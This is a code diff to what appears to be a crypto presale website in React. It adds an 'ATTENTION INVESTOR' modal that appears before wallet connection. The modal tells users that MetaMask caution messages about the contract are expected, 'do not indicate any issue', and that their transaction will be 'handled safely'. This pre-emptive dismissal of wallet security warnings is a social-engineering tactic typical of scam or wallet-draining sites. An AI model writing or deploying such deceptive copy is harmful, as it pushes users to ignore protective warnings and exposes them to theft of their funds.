@@ -168,6 +168,7 @@ const App: React.FC = () => {
   const [walletBalance, setWalletBalance] = useState<string>('0.00');
   const [tokenBalance, setTokenBalance] = useState<string>('0.00');
   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
+  const [isWarningModalOpen, setIsWarningModalOpen] = useState(false);
   const [isWhitepaperOpen, setIsWhitepaperOpen] = useState(false);
   const [isFaqOpen, setIsFaqOpen] = useState(false);
   const [activeFaqIndex, setActiveFaqIndex] = useState<number | null>(null);
@@ -402,6 +403,11 @@ const App: React.FC = () => {
   };
 
   const connectWalletHandler = async () => {
+    setIsWarningModalOpen(true);
+  };
+
+  const executeConnectWallet = async () => {
+    setIsWarningModalOpen(false);
     setIsConnecting(true);
     try {
       const address = await web3Connect();
@@ -702,7 +708,7 @@ const App: React.FC = () => {
 
         <div className="flex flex-col items-center gap-4 mb-20 md:mb-24">
            <button 
-             onClick={() => setIsWalletModalOpen(true)}
+             onClick={() => setIsWarningModalOpen(true)}
              className="px-8 md:px-16 py-4 md:py-5 bg-cyan-400 rounded-2xl font-black text-black text-base md:text-xl uppercase tracking-widest shadow-[0_0_40px_rgba(34,211,238,0.5)] hover:scale-105 transition-all"
            >
              CONNECT WALLET
@@ -1225,6 +1231,44 @@ const App: React.FC = () => {
         </div>
       )}
 
+      {isWarningModalOpen && (
+        <div className="fixed inset-0 z-[300] flex items-center justify-center p-4">
+          <div className="absolute inset-0 bg-black/95 backdrop-blur-xl" onClick={() => setIsWarningModalOpen(false)}></div>
+          <div className="relative w-full max-w-[500px] bg-[#0a0a14] border border-yellow-500/30 rounded-[2.5rem] p-8 md:p-12 shadow-[0_0_100px_rgba(0,0,0,1)] flex flex-col items-center animate-fade-in text-center">
+            <div className="w-20 h-20 bg-yellow-500/10 rounded-full flex items-center justify-center mb-8 border border-yellow-500/30">
+              <AlertCircle size={40} className="text-yellow-500" />
+            </div>
+            <h3 className="text-xl md:text-2xl font-black text-white uppercase mb-6 italic tracking-tighter">⚠️ ATTENTION INVESTOR</h3>
+            <div className="text-gray-300 text-sm md:text-base font-bold leading-relaxed mb-10 uppercase tracking-wide space-y-4">
+              <p>You are about to interact with our official presale smart contract.</p>
+              <p>
+                Please note: Some wallets, including MetaMask, may display a caution message because this contract is newly deployed and has not yet built a long transaction history yet
+              </p>
+              <p>
+                This is expected behavior and does not indicate any issue. The transaction will only process your purchase securely as intended, and everything will be handled safely.
+              </p>
+            </div>
+            <div className="grid grid-cols-1 gap-4 w-full">
+              <button 
+                onClick={() => {
+                  setIsWarningModalOpen(false);
+                  setIsWalletModalOpen(true);
+                }}
+                className="w-full py-5 bg-yellow-500 text-black font-black rounded-2xl uppercase text-sm md:text-base tracking-widest hover:bg-yellow-400 transition-all shadow-lg"
+              >
+                CONTINUE
+              </button>
+              <button 
+                onClick={() => setIsWarningModalOpen(false)}
+                className="w-full py-5 bg-white/5 border border-white/10 text-gray-400 font-black rounded-2xl uppercase text-sm md:text-base tracking-widest hover:bg-white/10 transition-all"
+              >
+                GO BACK
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       {isWalletModalOpen && (
         <div className="fixed inset-0 z-[150] flex items-center justify-center p-4">
           <div className="absolute inset-0 bg-black/95 backdrop-blur-2xl" onClick={() => setIsWalletModalOpen(false)}></div>
@@ -1249,7 +1293,7 @@ const App: React.FC = () => {
                  { name: 'Coinbase', icon: 'data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzAgMzAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTE1IDJhMTMgMTMgMCAxIDAgMTMgMTNBMTMgMTMgMCAwIDAgMTUgMnoiIGZpbGw9IiMwMDUyRkYiLz48L3N2Zz4=' },
                  { name: 'SafePal', icon: 'data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzAgMzAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTE1IDJhMTMgMTMgMCAxIDAgMTMgMTNBMTMgMTMgMCAwIDAgMTUgMnoiIGZpbGw9IiMwMEI4RkYiLz48L3N2Zz4=' }
                ].map(w => (
-                 <button key={w.name} onClick={() => connectWalletHandler()} className="flex flex-col items-center justify-center gap-5 p-6 bg-white/5 border border-white/10 rounded-[2rem] hover:bg-[#1a1a2e] hover:border-cyan-500/60 transition-all duration-300 group min-h-[160px] shadow-2xl">
+                 <button key={w.name} onClick={() => executeConnectWallet()} className="flex flex-col items-center justify-center gap-5 p-6 bg-white/5 border border-white/10 rounded-[2rem] hover:bg-[#1a1a2e] hover:border-cyan-500/60 transition-all duration-300 group min-h-[160px] shadow-2xl">
                     <div className="w-16 h-16 md:w-20 md:h-20 flex items-center justify-center">
                       <img src={w.icon} className="max-w-full max-h-full group-hover:scale-110 transition-transform duration-300 brightness-125 contrast-125 object-contain" alt={w.name} referrerPolicy="no-referrer" />
                     </div>
